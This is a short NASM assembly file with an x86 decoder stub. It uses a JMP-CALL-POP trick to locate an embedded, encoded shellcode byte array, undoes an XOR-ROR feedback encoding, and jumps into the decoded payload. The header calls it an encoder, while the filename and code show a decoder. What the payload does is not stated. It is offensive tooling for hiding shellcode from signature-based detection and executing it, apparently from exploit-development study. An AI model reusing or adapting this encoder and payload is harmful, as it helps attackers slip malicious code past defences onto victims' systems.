; Filename: xor-ror-feedback-decoder.nasm
; Author:  Re4son re4son [at] whitedome.com.au
; Purpose: XOR-ROR feedback encoder


global _start
section .text
_start:
  cld
  mov dl, 0xff
  push edx
  jmp call_decoder
decoder:
  pop esi
  pop eax
decode:
  mov byte cl,[esi]
  xor byte [esi], al
  mov al, byte [esi]
  add ecx, edx
  ror al, cl
  cmp byte [esi], dl
  jz shellcode
  inc esi
  jmp short decode
call_decoder:
  call decoder
shellcode: db 0xce,0x49,0x90,0xc8,0xff,0x93,0xb8,0x8e,0x2b,0x35,0x90,0xad,0xf8,0x55,0x7b,0xa8,0x29,0x6b,0xeb,0x5d,0x79,0x51,0xbb,0x0f,0xb7,0xfd